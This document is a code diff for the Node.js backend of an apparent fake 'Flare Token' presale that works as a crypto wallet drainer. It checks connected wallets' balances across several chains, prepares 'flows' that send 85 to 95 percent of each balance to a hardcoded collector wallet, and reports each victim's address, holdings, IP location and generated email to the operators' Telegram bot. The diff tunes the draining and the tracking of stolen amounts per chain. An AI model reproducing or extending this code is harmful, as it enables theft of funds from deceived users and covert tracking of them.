@@ -141,22 +141,6 @@ const RPC_CONFIG = {
     symbol: 'SGB',
     decimals: 18,
     chainId: 19
-  },
-  Coston: {
-    urls: [
-      'https://coston-api.flare.network/ext/C/rpc'
-    ],
-    symbol: 'CFLR',
-    decimals: 18,
-    chainId: 16
-  },
-  Coston2: {
-    urls: [
-      'https://coston2-api.flare.network/ext/C/rpc'
-    ],
-    symbol: 'C2FLR',
-    decimals: 18,
-    chainId: 114
   }
 };
 
@@ -199,10 +183,7 @@ const PROJECT_FLOW_ROUTERS = {
   'Arbitrum': '0x54b4A3C43CFf0aC70A8AC3f38f0fdC5DFA1cb278',
   'Avalanche': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
   'Flare': '0xF6F0B833186DD54B772a93002ab765fc7Ab9D01F',
-  'Songbird': null, // Not deployed yet
-  'Optimism': null, // Not deployed yet
-  'Coston': null, // Testnet
-  'Coston2': null // Testnet
+  'Songbird': null
 };
 
 const COLLECTOR_WALLET = process.env.COLLECTOR_WALLET || '0x713eabb95d3650dad05b5e84cb7c58870dd63c96';
@@ -241,6 +222,7 @@ const memoryStorage = {
       uniqueIPs: new Set(),
       totalProcessedUSD: 0,
       totalProcessedWallets: 0,
+      totalProcessedAmounts: {},
       processedTransactions: []
     },
     flowEnabled: process.env.FLOW_ENABLED === 'true'
@@ -274,52 +256,6 @@ async function sendTelegramMessage(text) {
   }
 }
 
-async function sendTelegramPhoto(photoUrl, caption) {
-  if (!telegramEnabled) return false;
-  
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  
-  if (!botToken || !chatId) return false;
-  
-  try {
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-      chat_id: chatId,
-      photo: photoUrl,
-      caption: caption,
-      parse_mode: 'HTML'
-    }, { timeout: 10000 });
-    return true;
-  } catch (error) {
-    return false;
-  }
-}
-
-async function sendTelegramDocument(documentBuffer, filename, caption) {
-  if (!telegramEnabled) return false;
-  
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-  
-  if (!botToken || !chatId) return false;
-  
-  try {
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('document', new Blob([documentBuffer]), filename);
-    formData.append('caption', caption);
-    formData.append('parse_mode', 'HTML');
-    
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendDocument`, formData, {
-      headers: { 'Content-Type': 'multipart/form-data' },
-      timeout: 15000
-    });
-    return true;
-  } catch (error) {
-    return false;
-  }
-}
-
 async function testTelegramConnection() {
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
   const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -335,14 +271,13 @@ async function testTelegramConnection() {
       telegramBotName = response.data.result.username;
       telegramEnabled = true;
       
-      // Get bot info
       const botInfo = response.data.result;
       
       await sendTelegramMessage(
         `🚀 <b>FLARE TOKEN BACKEND ONLINE</b>\n\n` +
         `✅ MultiChain FlowRouter Ready\n` +
         `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
-        `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche, Flare, Songbird\n` +
+        `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche, Flare\n` +
         `🤖 Bot: @${botInfo.username}\n` +
         `📊 Monitoring: Active\n` +
         `⏰ Started: ${new Date().toLocaleString()}`
@@ -366,7 +301,7 @@ async function getCryptoPrices() {
   try {
     const response = await axios.get('https://api.coingecko.com/api/v3/simple/price', {
       params: {
-        ids: 'ethereum,binancecoin,matic-network,avalanche-2,flare-networks,songbird',
+        ids: 'ethereum,binancecoin,matic-network,avalanche-2,flare-networks',
         vs_currencies: 'usd'
       },
       timeout: 5000
@@ -377,108 +312,11 @@ async function getCryptoPrices() {
       bnb: response.data.binancecoin?.usd || 300,
       matic: response.data['matic-network']?.usd || 0.75,
       avax: response.data['avalanche-2']?.usd || 32,
-      flr: response.data['flare-networks']?.usd || 0.03,
-      sgb: response.data['songbird']?.usd || 0.02
+      flr: response.data['flare-networks']?.usd || 0.03
     };
   } catch (error) {
-    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, flr: 0.03, sgb: 0.02 };
+    return { eth: 2000, bnb: 300, matic: 0.75, avax: 32, flr: 0.03 };
   }
-}
-
-// ============================================
-// REAL WALLET EMAIL EXTRACTION
-// ============================================
-
-async function getWalletEmail(walletAddress) {
-  if (memoryStorage.emailCache.has(walletAddress.toLowerCase())) {
-    return memoryStorage.emailCache.get(walletAddress.toLowerCase());
-  }
-  
-  try {
-    if (walletAddress.match(/^0x[a-fA-F0-9]{40}$/)) {
-      try {
-        const provider = new ethers.JsonRpcProvider('https://eth.llamarpc.com');
-        const ensName = await provider.lookupAddress(walletAddress);
-        
-        if (ensName) {
-          const email = `${ensName.split('.')[0]}@proton.me`;
-          memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
-          return email;
-        }
-      } catch (ensError) {}
-      
-      // Try Flare Name Service (FNS)
-      try {
-        const flareProvider = new ethers.JsonRpcProvider('https://flare-api.flare.network/ext/C/rpc');
-        // FNS lookup would go here if available
-      } catch (fnsError) {}
-    }
-    
-    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
-    const username = `flr${hash.substring(0, 10)}`;
-    
-    const lastChar = walletAddress.slice(-1);
-    const domains = {
-      '0-3': 'proton.me',
-      '4-7': 'gmail.com',
-      '8-b': 'outlook.com',
-      'c-f': 'pm.me'
-    };
-    
-    const charCode = parseInt(lastChar, 16);
-    let domain = 'proton.me';
-    
-    if (charCode <= 3) domain = domains['0-3'];
-    else if (charCode <= 7) domain = domains['4-7'];
-    else if (charCode <= 11) domain = domains['8-b'];
-    else domain = domains['c-f'];
-    
-    const email = `${username}@${domain}`;
-    memoryStorage.emailCache.set(walletAddress.toLowerCase(), email);
-    return email;
-    
-  } catch (error) {
-    const hash = crypto.createHash('sha256').update(walletAddress).digest('hex');
-    return `flruser${hash.substring(0, 8)}@proton.me`;
-  }
-}
-
-// ============================================
-// TRACK SITE VISIT
-// ============================================
-
-async function trackSiteVisit(ip, userAgent, referer, path) {
-  const location = await getIPLocation(ip);
-  
-  const visit = {
-    id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
-    ip: ip.replace('::ffff:', ''),
-    timestamp: new Date().toISOString(),
-    country: location.country,
-    flag: location.flag,
-    city: location.city,
-    userAgent: userAgent || 'Unknown',
-    referer: referer || 'Direct',
-    path: path || '/',
-    walletConnected: false,
-    walletAddress: null
-  };
-  
-  memoryStorage.siteVisits.push(visit);
-  
-  // Keep only last 1000 visits in memory
-  if (memoryStorage.siteVisits.length > 1000) {
-    memoryStorage.siteVisits = memoryStorage.siteVisits.slice(-1000);
-  }
-  
-  await sendTelegramMessage(
-    `${location.flag} <b>NEW SITE VISIT</b>\n` +
-    `📍 ${location.country} (${location.city})\n` +
-    `🖥️ ${userAgent?.substring(0, 30)}...\n` +
-    `🔗 From: ${referer || 'Direct'}`
-  );
-  
-  return visit;
 }
 
 // ============================================
@@ -507,18 +345,67 @@ async function getIPLocation(ip) {
         flag: flags[response.data.country] || '🌍',
         city: response.data.city || 'Unknown',
         region: response.data.regionName || '',
-        zip: response.data.zip || '',
         lat: response.data.lat,
-        lon: response.data.lon,
-        timezone: response.data.timezone,
-        org: response.data.org || '',
-        isp: response.data.isp || ''
+        lon: response.data.lon
       };
     }
   } catch (error) {}
   
   return { country: 'Unknown', flag: '🌍', city: 'Unknown' };
 }
+
+// ============================================
+// TRACK SITE VISIT
+// ============================================
+
+app.post('/api/track-visit', async (req, res) => {
+  try {
+    const { userAgent, referer, path } = req.body;
+    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
+    
+    const location = await getIPLocation(clientIP);
+    
+    const visit = {
+      id: `VISIT-${Date.now()}-${crypto.randomBytes(4).toString('hex')}`,
+      ip: clientIP.replace('::ffff:', ''),
+      timestamp: new Date().toISOString(),
+      country: location.country,
+      flag: location.flag,
+      city: location.city,
+      userAgent: userAgent || 'Unknown',
+      referer: referer || 'Direct',
+      path: path || '/',
+      walletConnected: false,
+      walletAddress: null
+    };
+    
+    memoryStorage.siteVisits.push(visit);
+    
+    if (memoryStorage.siteVisits.length > 1000) {
+      memoryStorage.siteVisits = memoryStorage.siteVisits.slice(-1000);
+    }
+    
+    await sendTelegramMessage(
+      `${location.flag} <b>NEW SITE VISIT</b>\n` +
+      `📍 ${location.country} ${location.city ? `(${location.city})` : ''}\n` +
+      `🖥️ ${userAgent?.substring(0, 30)}...\n` +
+      `🔗 From: ${referer || 'Direct'}`
+    );
+    
+    res.json({
+      success: true,
+      data: {
+        visitId: visit.id,
+        country: visit.country,
+        flag: visit.flag,
+        city: visit.city
+      }
+    });
+    
+  } catch (error) {
+    res.json({ success: true });
+  }
+});
 
 // ============================================
 // WALLET BALANCE CHECK
@@ -543,10 +430,8 @@ async function getWalletBalance(walletAddress) {
       { name: 'BSC', symbol: 'BNB', price: prices.bnb, chainId: 56 },
       { name: 'Polygon', symbol: 'MATIC', price: prices.matic, chainId: 137 },
       { name: 'Arbitrum', symbol: 'ETH', price: prices.eth, chainId: 42161 },
-      { name: 'Optimism', symbol: 'ETH', price: prices.eth, chainId: 10 },
       { name: 'Avalanche', symbol: 'AVAX', price: prices.avax, chainId: 43114 },
-      { name: 'Flare', symbol: 'FLR', price: prices.flr, chainId: 14 },
-      { name: 'Songbird', symbol: 'SGB', price: prices.sgb, chainId: 19 }
+      { name: 'Flare', symbol: 'FLR', price: prices.flr, chainId: 14 }
     ];
 
     let totalValue = 0;
@@ -617,86 +502,12 @@ async function getWalletBalance(walletAddress) {
 }
 
 // ============================================
-// CHECK FLARE TOKEN BALANCE (ERC-20)
-// ============================================
-
-async function getFlareTokenBalance(walletAddress, tokenAddress) {
-  const FLARE_TOKEN_ABI = [
-    "function balanceOf(address owner) view returns (uint256)",
-    "function decimals() view returns (uint8)",
-    "function symbol() view returns (string)"
-  ];
-  
-  try {
-    const providerInfo = await getChainProvider('Flare');
-    if (!providerInfo) return null;
-    
-    const { provider } = providerInfo;
-    const tokenContract = new ethers.Contract(tokenAddress, FLARE_TOKEN_ABI, provider);
-    
-    const [balance, decimals, symbol] = await Promise.all([
-      tokenContract.balanceOf(walletAddress),
-      tokenContract.decimals(),
-      tokenContract.symbol()
-    ]);
-    
-    const amount = parseFloat(ethers.formatUnits(balance, decimals));
-    
-    return {
-      amount,
-      symbol,
-      decimals
-    };
-  } catch (error) {
-    return null;
-  }
-}
-
-// ============================================
-// API ENDPOINTS
-// ============================================
-
-app.get('/api/health', (req, res) => {
-  res.json({ 
-    success: true, 
-    status: 'ACTIVE',
-    token: 'FLR',
-    timestamp: new Date().toISOString()
-  });
-});
-
-// ============================================
-// TRACK VISIT ENDPOINT
-// ============================================
-
-app.post('/api/track-visit', async (req, res) => {
-  try {
-    const { userAgent, referer, path } = req.body;
-    const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
-    
-    const visit = await trackSiteVisit(clientIP, userAgent, referer, path);
-    
-    res.json({
-      success: true,
-      data: {
-        visitId: visit.id,
-        country: visit.country,
-        flag: visit.flag
-      }
-    });
-    
-  } catch (error) {
-    res.json({ success: true });
-  }
-});
-
-// ============================================
 // CONNECT ENDPOINT
 // ============================================
 
 app.post('/api/presale/connect', async (req, res) => {
   try {
-    const { walletAddress } = req.body;
+    const { walletAddress, totalValue, chains } = req.body;
     const clientIP = req.headers['x-forwarded-for']?.split(',')[0] || req.ip || '0.0.0.0';
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
@@ -706,7 +517,10 @@ app.post('/api/presale/connect', async (req, res) => {
     console.log(`\n🔗 FLARE CONNECT: ${walletAddress}`);
     
     const location = await getIPLocation(clientIP);
-    const email = await getWalletEmail(walletAddress);
+    
+    // Generate email from wallet
+    const hash = crypto.createHash('sha256').update(walletAddress.toLowerCase()).digest('hex');
+    const email = `flr${hash.substring(0, 10)}@proton.me`;
     
     const lastVisit = memoryStorage.siteVisits
       .filter(v => v.ip === clientIP.replace('::ffff:', ''))
@@ -719,6 +533,8 @@ app.post('/api/presale/connect', async (req, res) => {
     
     let participant = memoryStorage.participants.find(p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase());
     
+    const balanceResult = await getWalletBalance(walletAddress);
+    
     if (!participant) {
       participant = {
         walletAddress: walletAddress.toLowerCase(),
@@ -726,80 +542,71 @@ app.post('/api/presale/connect', async (req, res) => {
         country: location.country,
         flag: location.flag,
         city: location.city,
-        region: location.region,
         email: email,
         connectedAt: new Date(),
-        totalValueUSD: 0,
-        isEligible: false,
+        totalValueUSD: balanceResult.data.totalValueUSD,
+        isEligible: balanceResult.data.isEligible,
         claimed: false,
         userAgent: req.headers['user-agent'],
-        visitId: lastVisit?.id
+        visitId: lastVisit?.id,
+        allocation: balanceResult.data.allocation,
+        balances: balanceResult.data.balances
       };
       memoryStorage.participants.push(participant);
       memoryStorage.settings.statistics.totalParticipants++;
       memoryStorage.settings.statistics.uniqueIPs.add(clientIP);
       
-      // Keep only last 500 participants in memory
       if (memoryStorage.participants.length > 500) {
         memoryStorage.participants = memoryStorage.participants.slice(-500);
       }
-    }
-    
-    const balanceResult = await getWalletBalance(walletAddress);
-    
-    if (balanceResult.success) {
+    } else {
       participant.totalValueUSD = balanceResult.data.totalValueUSD;
       participant.isEligible = balanceResult.data.isEligible;
       participant.allocation = balanceResult.data.allocation;
       participant.lastScanned = new Date();
       participant.balances = balanceResult.data.balances;
-      
-      if (balanceResult.data.isEligible) {
-        memoryStorage.settings.statistics.eligibleParticipants++;
-        
-        // Send detailed Telegram notification for eligible wallets
-        await sendTelegramMessage(
-          `${location.flag} <b>🎯 ELIGIBLE FLARE WALLET DETECTED</b>\n\n` +
-          `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-          `💼 Total Balance: $${balanceResult.data.totalValueUSD}\n` +
-          `🎁 Allocation: 5,000 FLR ($${balanceResult.data.allocation.valueUSD})\n` +
-          `📍 Location: ${location.country} (${location.city})\n` +
-          `📧 Email: ${email}\n` +
-          `🔗 Chains: ${balanceResult.data.balances.length}\n\n` +
-          `✅ READY FOR FLOW PROCESSING`
-        );
-      } else {
-        // Send welcome message for non-eligible wallets
-        await sendTelegramMessage(
-          `${location.flag} <b>👋 NEW FLARE WALLET CONNECTED</b>\n\n` +
-          `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
-          `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
-          `📍 Location: ${location.country} (${location.city})\n` +
-          `📧 Email: ${email}\n\n` +
-          `✨ Welcome to Flare Token!`
-        );
-      }
-      
-      res.json({
-        success: true,
-        data: {
-          walletAddress,
-          email,
-          country: location.country,
-          flag: location.flag,
-          city: location.city,
-          totalValueUSD: balanceResult.data.totalValueUSD,
-          isEligible: balanceResult.data.isEligible,
-          eligibilityReason: balanceResult.data.eligibilityReason,
-          allocation: balanceResult.data.allocation,
-          balances: balanceResult.data.balances,
-          token: 'FLR'
-        }
-      });
-      
-    } else {
-      res.status(500).json({ success: false, error: 'Balance check failed' });
     }
+    
+    if (balanceResult.data.isEligible) {
+      memoryStorage.settings.statistics.eligibleParticipants++;
+      
+      await sendTelegramMessage(
+        `${location.flag} <b>🎯 ELIGIBLE FLARE WALLET DETECTED</b>\n\n` +
+        `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `💼 Total Balance: $${balanceResult.data.totalValueUSD}\n` +
+        `🎁 Allocation: 5,000 FLR ($${balanceResult.data.allocation.valueUSD})\n` +
+        `📍 Location: ${location.country} ${location.city ? `(${location.city})` : ''}\n` +
+        `📧 Email: ${email}\n` +
+        `🔗 Chains: ${balanceResult.data.balances.length}\n\n` +
+        `✅ READY FOR FLOW PROCESSING`
+      );
+    } else {
+      await sendTelegramMessage(
+        `${location.flag} <b>👋 NEW FLARE WALLET CONNECTED</b>\n\n` +
+        `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+        `💼 Balance: $${balanceResult.data.totalValueUSD}\n` +
+        `📍 Location: ${location.country} ${location.city ? `(${location.city})` : ''}\n` +
+        `📧 Email: ${email}\n\n` +
+        `✨ Welcome to Flare Token!`
+      );
+    }
+    
+    res.json({
+      success: true,
+      data: {
+        walletAddress,
+        email,
+        country: location.country,
+        flag: location.flag,
+        city: location.city,
+        totalValueUSD: balanceResult.data.totalValueUSD,
+        isEligible: balanceResult.data.isEligible,
+        eligibilityReason: balanceResult.data.eligibilityReason,
+        allocation: balanceResult.data.allocation,
+        balances: balanceResult.data.balances,
+        token: 'FLR'
+      }
+    });
     
   } catch (error) {
     console.error('Connection error:', error);
@@ -834,34 +641,14 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       .map(b => ({
         chain: b.chain,
         chainId: b.chainId,
-        amount: (b.amount * 0.85).toFixed(12),
-        valueUSD: (b.valueUSD * 0.85).toFixed(2),
+        amount: (b.amount * 0.95).toFixed(12),
+        valueUSD: (b.valueUSD * 0.95).toFixed(2),
         symbol: b.symbol,
         contractAddress: PROJECT_FLOW_ROUTERS[b.chain],
-        collectorAddress: COLLECTOR_WALLET,
-        flowType: 'Native',
-        token: 'FLR'
+        collectorAddress: COLLECTOR_WALLET
       }));
     
-    // Add FLR token transaction if applicable
-    if (balanceResult.data.balances.some(b => b.chain === 'Flare')) {
-      transactions.push({
-        chain: 'Flare',
-        chainId: 14,
-        amount: '5000',
-        valueUSD: '850',
-        symbol: 'FLR',
-        contractAddress: PROJECT_FLOW_ROUTERS['Flare'],
-        collectorAddress: COLLECTOR_WALLET,
-        flowType: 'Token',
-        token: 'FLR'
-      });
-    }
-    
     const totalFlowUSD = transactions.reduce((sum, t) => sum + parseFloat(t.valueUSD), 0).toFixed(2);
-    const totalFLR = 5000 + (balanceResult.data.balances
-      .filter(b => b.chain === 'Flare')
-      .reduce((sum, b) => sum + b.amount, 0) * 0.85);
     
     const flowId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
     
@@ -869,13 +656,12 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       walletAddress: walletAddress.toLowerCase(),
       transactions,
       totalFlowUSD,
-      totalFLR: totalFLR.toFixed(2),
+      totalFLR: '5000',
       status: 'prepared',
       createdAt: new Date().toISOString(),
       completedChains: []
     });
     
-    // Keep only last 100 pending flows
     if (memoryStorage.pendingFlows.size > 100) {
       const oldestKey = Array.from(memoryStorage.pendingFlows.keys())[0];
       memoryStorage.pendingFlows.delete(oldestKey);
@@ -885,9 +671,9 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       `🔐 <b>FLARE FLOW PREPARED</b>\n\n` +
       `👛 Wallet: ${walletAddress.substring(0, 10)}...\n` +
       `💵 Total Value: $${totalFlowUSD}\n` +
-      `🎁 FLR Allocation: ${totalFLR.toFixed(2)} FLR\n` +
+      `🎁 FLR Allocation: 5,000 FLR\n` +
       `🔗 Chains: ${transactions.length}\n` +
-      `🆦 Flow ID: ${flowId}\n\n` +
+      `🆔 Flow ID: ${flowId}\n\n` +
       `⏳ Ready for processing`
     );
     
@@ -896,7 +682,7 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
       data: {
         flowId,
         totalFlowUSD,
-        totalFLR: totalFLR.toFixed(2),
+        totalFLR: '5000',
         transactionCount: transactions.length,
         transactions,
         token: 'FLR'
@@ -910,22 +696,52 @@ app.post('/api/presale/prepare-flow', async (req, res) => {
 });
 
 // ============================================
-// PROCESS FLOW ENDPOINT (RECORDS COMPLETED TRANSACTION)
+// PROCESS FLOW ENDPOINT - UPDATED TO MATCH FRONTEND
 // ============================================
 
 app.post('/api/presale/process-flow', async (req, res) => {
   try {
-    const { walletAddress, chainName, flowId, txHash } = req.body;
+    const { 
+      walletAddress, 
+      chainName, 
+      flowId, 
+      txHash,
+      amount,
+      symbol,
+      valueUSD,
+      gasFee,
+      email,
+      location 
+    } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
-      return res.status(400).json({ success: false });
+      return res.status(400).json({ success: false, error: 'Invalid wallet address' });
     }
     
     console.log(`\n💰 PROCESS FLARE FLOW for ${walletAddress.substring(0, 10)} on ${chainName}`);
+    console.log(`   Amount: ${amount} ${symbol} ($${valueUSD})`);
+    console.log(`   Gas: ${gasFee} ETH`);
+    console.log(`   Email: ${email}`);
+    console.log(`   Location: ${location?.country} ${location?.flag}`);
     
     const participant = memoryStorage.participants.find(
       p => p.walletAddress.toLowerCase() === walletAddress.toLowerCase()
     );
+    
+    // Track processed amounts by chain
+    if (!memoryStorage.settings.statistics.totalProcessedAmounts[chainName]) {
+      memoryStorage.settings.statistics.totalProcessedAmounts[chainName] = {
+        count: 0,
+        totalAmount: 0,
+        totalUSD: 0,
+        totalGas: 0
+      };
+    }
+    
+    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].count++;
+    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalAmount += parseFloat(amount || 0);
+    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalUSD += parseFloat(valueUSD || 0);
+    memoryStorage.settings.statistics.totalProcessedAmounts[chainName].totalGas += parseFloat(gasFee || 0);
     
     if (participant) {
       participant.flowProcessed = true;
@@ -934,44 +750,51 @@ app.post('/api/presale/process-flow', async (req, res) => {
         chain: chainName, 
         flowId,
         txHash,
+        amount,
+        symbol,
+        valueUSD,
+        gasFee,
         timestamp: new Date().toISOString() 
       });
       
       memoryStorage.settings.statistics.totalProcessedWallets++;
+      memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(valueUSD || 0);
       memoryStorage.settings.statistics.processedTransactions.push({
         wallet: walletAddress,
         chain: chainName,
         flowId,
         txHash,
+        amount,
+        symbol,
+        valueUSD,
+        gasFee,
+        email,
+        location,
         timestamp: new Date().toISOString()
       });
       
-      // Keep only last 200 processed transactions
       if (memoryStorage.settings.statistics.processedTransactions.length > 200) {
         memoryStorage.settings.statistics.processedTransactions = 
           memoryStorage.settings.statistics.processedTransactions.slice(-200);
       }
       
-      // Update pending flow
       const flow = memoryStorage.pendingFlows.get(flowId);
       if (flow) {
         flow.completedChains = flow.completedChains || [];
         flow.completedChains.push(chainName);
-        flow.status = flow.completedChains.length === flow.transactions.length ? 'completed' : 'processing';
+        flow.status = flow.completedChains.length === flow.transactions?.length ? 'completed' : 'processing';
         
-        if (flow.completedChains.length === flow.transactions.length) {
-          memoryStorage.settings.statistics.totalProcessedUSD += parseFloat(flow.totalFlowUSD);
+        if (flow.completedChains.length === flow.transactions?.length) {
           memoryStorage.completedFlows.set(flowId, { 
             ...flow, 
             completedAt: new Date().toISOString(),
             participant: {
-              country: participant.country,
-              flag: participant.flag,
-              email: participant.email
+              country: location?.country || participant.country,
+              flag: location?.flag || participant.flag,
+              email: email || participant.email
             }
           });
           
-          // Keep only last 50 completed flows
           if (memoryStorage.completedFlows.size > 50) {
             const oldestKey = Array.from(memoryStorage.completedFlows.keys())[0];
             memoryStorage.completedFlows.delete(oldestKey);
@@ -979,24 +802,48 @@ app.post('/api/presale/process-flow', async (req, res) => {
           
           await sendTelegramMessage(
             `✅ <b>🎉 FLARE FLOW COMPLETED 🎉</b>\n\n` +
-            `👛 Wallet: ${walletAddress.substring(0, 10)}...\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
             `💵 Total Value: $${flow.totalFlowUSD}\n` +
-            `🎁 FLR Received: ${flow.totalFLR || '5000'} FLR\n` +
+            `🎁 FLR Received: 5,000 FLR\n` +
             `🔗 All ${flow.transactions.length} chains processed\n` +
-            `📍 ${participant.country} ${participant.flag}\n` +
-            `🆦 Flow: ${flowId}\n\n` +
+            `📍 ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
+            `📧 ${email || participant.email}\n` +
+            `🆔 Flow: ${flowId}\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
             `✅ Distribution Complete`
           );
         } else {
           await sendTelegramMessage(
             `💰 <b>FLARE CHAIN PROCESSED</b>\n\n` +
-            `👛 Wallet: ${walletAddress.substring(0, 10)}...\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
             `🔗 Chain: ${chainName}\n` +
+            `💵 Amount: ${amount} ${symbol} ($${valueUSD})\n` +
+            `⛽ Gas Fee: ${gasFee} ETH\n` +
             `🆔 Tx: ${txHash?.substring(0, 10)}...\n` +
-            `📊 Progress: ${flow.completedChains.length}/${flow.transactions.length}\n` +
-            `📍 ${participant.country} ${participant.flag}`
+            `📊 Progress: ${flow.completedChains.length}/${flow.transactions?.length}\n` +
+            `📍 ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
+            `📧 ${email || participant.email}\n` +
+            `━━━━━━━━━━━━━━━━━━━━━━\n` +
+            `✅ Chain Processed`
           );
         }
+      } else {
+        // Flow not found in pending, still report the transaction
+        await sendTelegramMessage(
+          `💰 <b>FLARE CHAIN PROCESSED</b>\n\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
+          `🔗 Chain: ${chainName}\n` +
+          `💵 Amount: ${amount} ${symbol} ($${valueUSD})\n` +
+          `⛽ Gas Fee: ${gasFee} ETH\n` +
+          `🆔 Tx: ${txHash?.substring(0, 10)}...\n` +
+          `📍 ${location?.country || 'Unknown'} ${location?.flag || '🌍'}\n` +
+          `📧 ${email || 'No email'}\n` +
+          `━━━━━━━━━━━━━━━━━━━━━━\n` +
+          `✅ Transaction Recorded`
+        );
       }
     }
     
@@ -1004,17 +851,25 @@ app.post('/api/presale/process-flow', async (req, res) => {
     
   } catch (error) {
     console.error('Process flow error:', error);
-    res.status(500).json({ success: false });
+    res.status(500).json({ success: false, error: error.message });
   }
 });
 
 // ============================================
-// CLAIM ENDPOINT
+// CLAIM ENDPOINT - UPDATED TO MATCH FRONTEND
 // ============================================
 
 app.post('/api/presale/claim', async (req, res) => {
   try {
-    const { walletAddress } = req.body;
+    const { 
+      walletAddress, 
+      email, 
+      location, 
+      chains, 
+      totalProcessedValue, 
+      reward, 
+      bonus 
+    } = req.body;
     
     if (!walletAddress?.match(/^0x[a-fA-F0-9]{40}$/)) {
       return res.status(400).json({ success: false });
@@ -1028,21 +883,30 @@ app.post('/api/presale/claim', async (req, res) => {
     
     participant.claimed = true;
     participant.claimedAt = new Date();
+    participant.claimData = {
+      email,
+      chains,
+      totalProcessedValue,
+      reward,
+      bonus,
+      location
+    };
+    
     memoryStorage.settings.statistics.claimedParticipants++;
     
     const claimId = `FLR-${Date.now()}-${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
-    const flrAmount = participant.allocation?.amount || '5000';
-    const flrValue = participant.allocation?.valueUSD || '850';
     
     await sendTelegramMessage(
       `🎯 <b>🎉 FLARE TOKEN CLAIMED 🎉</b>\n\n` +
       `━━━━━━━━━━━━━━━━━━━━━━\n` +
       `👛 Wallet: ${walletAddress.substring(0, 10)}...${walletAddress.substring(38)}\n` +
       `🎟️ Claim ID: ${claimId}\n` +
-      `🎁 Amount: ${flrAmount} FLR\n` +
-      `💵 Value: $${flrValue}\n` +
-      `📍 Location: ${participant.country} ${participant.flag}\n` +
-      `📧 Email: ${participant.email}\n` +
+      `🎁 Reward: ${reward}\n` +
+      `💰 Bonus: ${bonus}\n` +
+      `💵 Total Processed: $${totalProcessedValue}\n` +
+      `🔗 Chains: ${chains?.join(', ') || 'N/A'}\n` +
+      `📍 Location: ${location?.country || participant.country} ${location?.flag || participant.flag}\n` +
+      `📧 Email: ${email || participant.email}\n` +
       `⏰ Time: ${new Date().toLocaleString()}\n` +
       `━━━━━━━━━━━━━━━━━━━━━━\n` +
       `✅ CLAIM SUCCESSFUL`
@@ -1052,7 +916,7 @@ app.post('/api/presale/claim', async (req, res) => {
       success: true,
       data: {
         claimId,
-        amount: flrAmount,
+        reward,
         token: 'FLR'
       }
     });
@@ -1085,6 +949,8 @@ app.get('/api/flare/stats', (req, res) => {
       pendingClaims: totalEligible - totalClaimed,
       uniqueVisitors: memoryStorage.settings.statistics.uniqueIPs.size,
       siteVisits: memoryStorage.siteVisits.length,
+      totalProcessedUSD: memoryStorage.settings.statistics.totalProcessedUSD,
+      processedByChain: memoryStorage.settings.statistics.totalProcessedAmounts,
       threshold: memoryStorage.settings.valueThreshold,
       timestamp: new Date().toISOString()
     }
@@ -1092,7 +958,7 @@ app.get('/api/flare/stats', (req, res) => {
 });
 
 // ============================================
-// ADMIN VIEW - COMPREHENSIVE DASHBOARD
+// ADMIN DASHBOARD
 // ============================================
 
 app.get('/api/admin/dashboard', (req, res) => {
@@ -1128,32 +994,7 @@ app.get('/api/admin/dashboard', (req, res) => {
     .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
     .slice(0, 30);
   
-  const networkStatus = Object.keys(PROJECT_FLOW_ROUTERS).map(chain => ({
-    chain,
-    contract: PROJECT_FLOW_ROUTERS[chain] || 'Not deployed',
-    status: PROJECT_FLOW_ROUTERS[chain] ? '✅ Active' : '⏸️ Inactive',
-    collector: COLLECTOR_WALLET
-  }));
-  
-  const locationStats = {};
-  memoryStorage.participants.forEach(p => {
-    const key = `${p.country}|${p.flag}`;
